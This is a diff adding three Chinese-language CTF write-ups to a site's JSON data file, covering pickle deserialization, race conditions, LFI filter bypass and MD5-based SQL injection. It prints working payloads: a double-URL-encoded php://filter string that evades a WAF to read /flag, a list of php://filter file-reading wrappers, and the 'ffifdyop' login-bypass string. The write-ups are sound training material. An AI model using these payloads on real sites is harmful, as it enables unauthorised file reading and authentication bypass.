@@ -899,11 +899,59 @@
       "category_name": "CMD",
       "category_icon": "⌨️",
       "category_color": "#ff2d95"
+    },
+    {
+      "slug": "0xgame2025",
+      "title": "0xGame2025 CTF WriteUp",
+      "subtitle": "2026-06-16 | 16/28 题解出",
+      "category_id": 1,
+      "platform": "QingCen",
+      "difficulty": "Hard",
+      "tags": "[\"deserialization\",\"race-condition\",\"LFI\",\"variable-overwrite\",\"MD5\",\"SQLi\"]",
+      "description": "反序列化/竞态条件/LFI/变量覆盖/MD5 SQLi",
+      "solved": 16,
+      "created_at": "2026-06-16",
+      "content": "# 0xGame2025 CTF WriteUp\n\n**日期**: 2026-06-16\n**平台**: 青岑 CTF (ctf.qingcen.net)\n**战绩**: 16/28 题解出，Problemset 72\n\n## 关键题目\n\n### 马哈鱼商店 (621) - Pickle反序列化RCE\n\ndiscount篡改 + pickle反序列化RCE\n\n**Flag**: `flag{97ddfbd2-5099-4e08-bfb6-6af57aa0724a}`\n\n### Web_test_7 (734) - 竞态条件\n\n积分商城兑换接口存在竞态条件，使用concurrent.futures并发请求绕过积分检查。\n\n### web_test_8 (747) - LFI Filter Bypass\n\n`%09`（TAB）打断子串匹配，绕过`/flag`过滤。\n\n### web_test_9 (790) - PHP反序列化NULL vs FALSE\n\n`NULL !== FALSE` 但 `md5(NULL) === md5(FALSE)`\n\n### web_test_11 (792) - MD5 Raw Binary SQLi\n\n密码\"ffifdyop\"的MD5原始二进制包含`'or'`，实现SQL注入。",
+      "category_name": "Web",
+      "category_icon": "🌐",
+      "category_color": "#00d4ff"
+    },
+    {
+      "id": 908,
+      "title": "ezinfoleak — PHP LFI 双重URL编码WAF绕过",
+      "slug": "qingcen-ezinfoleak",
+      "category_id": 1,
+      "platform": "QingCen",
+      "difficulty": "Medium",
+      "tags": "[\"LFI\",\"php-filter\",\"WAF-bypass\",\"double-url-encode\",\"rot13\"]",
+      "description": "PHP文件包含漏洞，通过双重URL编码绕过WAF，rot13 filter绕过输出过滤，读取flag",
+      "solved": 1,
+      "created_at": "2026-06-24",
+      "content": "# ezinfoleak — PHP LFI 双重URL编码WAF绕过\n\n## 题目信息\n\n- **平台**: QingCen CTF (ctf.qingcen.net)\n- **题目集**: PS11 Web 入门\n- **环境**: PHP 8.2.30, Docker容器\n- **考点**: PHP文件包含(LFI) + WAF绕过 + php://filter\n\n## 题目分析\n\n题目提供了一个运维文件浏览系统，通过 `?file=` 参数浏览文件。目标是读取服务器上的 `/flag` 文件。\n\n但题目设置了多层WAF：\n\n### 输入过滤（WAF层1）\n\n对 `?file=` 参数进行黑名单检测，拦截以下字符串：\n- `/` — 路径分隔符\n- `:` — 协议分隔符（阻止 `php://`）\n- `php` — PHP关键词\n- `base64`, `data`, `zip`, `rar` — 常见wrapper\n- `filter` — filter链\n- `flag` — 目标文件名\n\n### 输出过滤（WAF层2）\n\n响应内容会被递归base64解码，然后检测输出中是否包含字符 `f`（小写），如果包含则拦截。这防止了直接使用 `php://filter/convert.base64-encode/resource=/flag` 的方式。\n\n## 漏洞分析\n\n关键漏洞在于 **`urldecode()` 执行时机在WAF检查之后**：\n\n```\n用户输入 → WAF检测 → urldecode() → 文件包含\n```\n\n这意味着WAF检查的是**原始输入**，而PHP实际使用**URL解码后的值**。\n\n## 解题步骤\n\n### Step 1: 发现双重编码绕过\n\n对 `/` 进行双重URL编码：\n- `/` 的URL编码 = `%2F`\n- `%` 的URL编码 = `%25`\n- 所以 `/` 的双重编码 = `%252F`\n\nWAF看到 `%252F`（不含 `/`），放行。\nPHP做一次URL解码后得到 `%2F`，再被 `urldecode()` 解码为 `/`。\n\n### Step 2: 构造payload读取文件\n\n我们需要同时绕过输入WAF和输出WAF：\n\n**绕过输入WAF**：对所有被拦截的字符做双重URL编码\n- `/` → `%252F`\n- `:` → `%253A`\n\n**绕过输出WAF**：不使用 `base64-encode`（输出含f），改用 `string.rot13` filter\n- ROT13编码后：`flag` → `synt`（不含 `f`！）\n\n### Step 3: 最终Payload\n\n```\nphp://filter/string.rot13/resource=/flag\n```\n\n经过双重编码后：\n```\nphp:%252F%252Ffilter%252Fstring.rot13%252Fresource=%252Fflag\n```\n\n### Step 4: 解码结果\n\n服务器返回ROT13编码的内容，用Python解码：\n\n```python\nimport codecs\nencoded = \"synt{063ad346-08c4-42fa-9f2b-3b2a89f70b85}\"\nflag = codecs.decode(encoded, 'rot13')\nprint(flag)  # flag{063ad346-08c4-42fa-9f2b-3b2a89f70b85}\n```\n\n## Flag\n\n```\nflag{063ad346-08c4-42fa-9f2b-3b2a89f70b85}\n```\n\n## Payload 构造总结\n\n| 原始字符 | 含义 | 双重URL编码 |\n|----------|------|-------------|\n| `/` | 路径分隔 | `%252F` |\n| `:` | 协议分隔 | `%253A` |\n| `%` | 编码前缀 | `%25` |\n\n## 关键教训\n\n1. **WAF顺序漏洞**：`urldecode()` 应在WAF检查**之前**执行，否则双重编码可以绕过\n2. **php://filter的创意用法**：除了 `convert.base64-encode`，还有 `string.rot13`, `string.toupper`, `string.tolower` 等filter可用\n3. **输出过滤往往不如输入过滤严格**：本题输出只过滤了 `f`，换用ROT13即可避开\n4. **PHP filter链参考**：`zlib.deflate`、`convert.iconv.*` 等都可以作为备选方案\n\n## 相关知识\n\n### PHP Wrapper 总结\n\n```\nphp://filter/read=convert.base64-encode/resource=FILE      # base64输出\nphp://filter/string.rot13/resource=FILE                     # ROT13输出\nphp://filter/string.toupper/resource=FILE                   # 全大写输出\nphp://filter/zlib.deflate/resource=FILE                     # 压缩输出（二进制）\nphp://filter/convert.iconv.utf-8.utf-16/resource=FILE       # 编码转换\n```\n\n---\n*WriteUp by heliumsenbrg, 2026-06-25*",
+      "category_name": "Web",
+      "category_icon": "🌐",
+      "category_color": "#00d4ff"
+    },
+    {
+      "id": 801,
+      "title": "lit_pujail_reader — Python Pyjail 字符串反转验证绕过",
+      "slug": "qingcen-lit-pujail-reader",
+      "category_id": 4,
+      "platform": "QingCen",
+      "difficulty": "Easy",
+      "tags": "[\"pyjail\",\"socket\",\"string-reverse\",\"misc\"]",
+      "description": "Python pyjail服务，通过字符串反转验证后读取指定路径文件获取flag",
+      "solved": 1,
+      "created_at": "2026-06-24",
+      "content": "# lit_pujail_reader — Python Pyjail 字符串反转验证绕过\n\n## 题目信息\n\n- **平台**: QingCen CTF (ctf.qingcen.net)\n- **题目集**: PS85 LitCTF 2026\n- **题目ID**: 801\n- **分值**: 344pts\n- **类型**: Misc (Pyjail)\n- **标签**: LitCTF2026\n\n## 题目描述\n\n远程有一个「只会帮你读文件」的小服务：先过一道字符串反序小验证，再按提示分两步读出 flag——不需要猜路径，也不需要 RCE。\n\n## 解题步骤\n\n### Step 1: 连接服务\n\n服务运行在 `docker.qingcen.net:33455`，通过TCP Socket连接：\n\n```python\nimport socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((\"docker.qingcen.net\", 33455))\n```\n\n### Step 2: 字符串反转验证\n\n服务端发送一个字符串，要求返回其反转结果：\n\n```\nPlease enter the reverse of 'abc123xyz':\n```\n\n这是一个简单的验证机制，排除机器人。直接用Python反转：\n\n```python\nimport re\ninitial = s.recv(1024).decode()\nmatch = re.search(r\"reverse of '([^']+)'\", initial)\nto_reverse = match.group(1)\nreversed_str = to_reverse[::-1]  # Python切片反转\ns.send((reversed_str + \"\\n\").encode())\n```\n\n### Step 3: 读取flag路径\n\n验证通过后，服务会提示下一步操作。根据题目提示，第一步读取 `/app/where_is_flag.txt`：\n\n```python\ns.send(b\"/app/where_is_flag.txt\\n\")\nresponse = s.recv(4096).decode()\n# Response contains the actual flag file path, e.g.:\n# /app/secret_flag_xxx.txt\n```\n\n### Step 4: 读取flag文件\n\n提取上一步的路径，再次发送读文件请求：\n\n```python\n# 从响应中提取flag文件路径\nlines = response.split('\\n')\nflag_path = None\nfor line in lines:\n    if '/' in line and 'flag' in line.lower():\n        flag_path = line.strip()\n        break\n\n# 读取flag\ns.send((flag_path + \"\\n\").encode())\nflag = s.recv(4096).decode()\nprint(flag)\n```\n\n## Flag\n\n```\nflag{31ee8d1a-ab6d-40a4-9f9e-4cfda5cbdb5d}\n```\n\n## 完整解题脚本\n\n```python\nimport socket\nimport re\n\nHOST = \"docker.qingcen.net\"\nPORT = 33455\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((HOST, PORT))\n\n# Step 1: 接收反转验证\ninitial = s.recv(1024).decode()\nprint(f\"Initial: {initial}\")\n\nmatch = re.search(r\"reverse of '([^']+)'\", initial)\nif match:\n    to_reverse = match.group(1)\n    reversed_str = to_reverse[::-1]\n    print(f\"Sending: {reversed_str}\")\n    s.send((reversed_str + \"\\n\").encode())\n\n    # Step 2: 读取flag路径\n    response = s.recv(1024).decode()\n    print(f\"Response: {response}\")\n\n    s.send(b\"/app/where_is_flag.txt\\n\")\n    response = s.recv(4096).decode()\n    print(f\"Flag path: {response}\")\n\n    # Step 3: 读取flag\n    lines = response.split('\\n')\n    for line in lines:\n        if '/' in line and 'flag' in line.lower():\n            flag_path = line.strip()\n            s.send((flag_path + \"\\n\").encode())\n            flag = s.recv(4096).decode()\n            print(f\"FLAG: {flag}\")\n            break\n\ns.close()\n```\n\n## 关键教训\n\n1. **遵循题目提示**：题目明确说了\"分两步读出flag\"，不需要额外猜测或尝试RCE\n2. **Socket编程基础**：CTF中经常遇到直接TCP连接的服务（非HTTP），掌握`socket`模块的基本用法很重要\n3. **正则提取**：用`re.search`从提示文本中提取动态内容（反转字符串、flag路径）\n4. **不要过度思考**：简单的Misc题可能就真的只考察\"读懂题目并按要求操作\"的能力\n\n---\n*WriteUp by heliumsenbrg, 2026-06-25*",
+      "category_name": "Misc",
+      "category_icon": "🧩",
+      "category_color": "#ffd700"
     }
   ],
   "stats": {
-    "total": 52,
-    "solved": 51,
+    "total": 70,
+    "solved": 69,
     "categories": 11,
     "firstBlood": 4
   }
